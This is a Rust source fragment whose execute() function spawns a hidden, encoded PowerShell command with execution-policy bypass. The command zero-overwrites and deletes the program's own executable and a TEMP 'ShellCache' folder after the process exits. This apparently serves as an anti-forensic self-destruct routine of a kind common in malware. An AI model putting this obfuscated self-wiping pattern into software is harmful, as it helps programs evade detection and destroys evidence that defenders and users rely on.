pub fn execute() {
    #[cfg(windows)]
    {
        use std::os::windows::process::CommandExt;
        const CHILD_FLAGS: u32 = 0x0800_0000 | 0x0000_0200 | 0x0100_0000;

        let pid = std::process::id();
        let exe = std::env::current_exe()
            .map(|p| p.to_string_lossy().replace('\'', "''"))
            .unwrap_or_default();

        if exe.is_empty() {
            log::error!("current_exe() failed");
        } else {
            let sysroot = std::env::var_os("SystemRoot").unwrap_or_else(|| "C:\\Windows".into());
            let ps_exe = std::path::Path::new(&sysroot)
                .join(r"System32\WindowsPowerShell\v1.0\powershell.exe");

            let script = format!(
                r#"$deadline=(Get-Date).AddSeconds(30)
while((Get-Process -Id {pid} -ErrorAction SilentlyContinue) -and ((Get-Date) -lt $deadline)){{ Start-Sleep -Milliseconds 200 }}
$p='{exe}'
try{{
    $fs=[IO.File]::Open($p,'Open','ReadWrite','None')
    $len=$fs.Length
    $buf=New-Object byte[] (1048576)
    while($fs.Position -lt $len){{
        $n=[Math]::Min(1048576,[int]($len-$fs.Position))
        $fs.Write($buf,0,$n)
    }}
    $fs.Flush($true)
    $fs.Close()
}}catch{{}}
try{{
    Remove-Item -LiteralPath $p -Force
}}catch{{}}
Remove-Item -LiteralPath (Join-Path $env:TEMP 'ShellCache') -Recurse -Force -ErrorAction SilentlyContinue
"#
            );

            match std::process::Command::new(&ps_exe)
                .args([
                    "-NoProfile",
                    "-NonInteractive",
                    "-ExecutionPolicy",
                    "Bypass",
                    "-EncodedCommand",
                    &powershell_encoded(&script),
                ])
                .creation_flags(CHILD_FLAGS)
                .spawn()
            {
                Ok(_) => log::debug!("SPAWNED pid={pid} exe={exe}"),
                Err(e) => log::error!("SPAWN_ERR: {} (ps={:?})", e, ps_exe),
            }
        }
    }

    std::process::exit(0);
}

#[cfg(windows)]
fn powershell_encoded(script: &str) -> String {
    const ALPHABET: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut bytes = Vec::with_capacity(script.len() * 2);
    for unit in script.encode_utf16() {
        bytes.push(unit as u8);
        bytes.push((unit >> 8) as u8);
    }
    let mut out = String::with_capacity((bytes.len() + 2) / 3 * 4);
    for chunk in bytes.chunks(3) {
        let b = [
            chunk[0],
            *chunk.get(1).unwrap_or(&0),
            *chunk.get(2).unwrap_or(&0),
        ];
        let n = (u32::from(b[0]) << 16) | (u32::from(b[1]) << 8) | u32::from(b[2]);
        out.push(ALPHABET[(n >> 18) as usize & 63] as char);
        out.push(ALPHABET[(n >> 12) as usize & 63] as char);
        out.push(if chunk.len() > 1 { ALPHABET[(n >> 6) as usize & 63] as char } else { '=' });
        out.push(if chunk.len() > 2 { ALPHABET[n as usize & 63] as char } else { '=' });
    }
    out
}

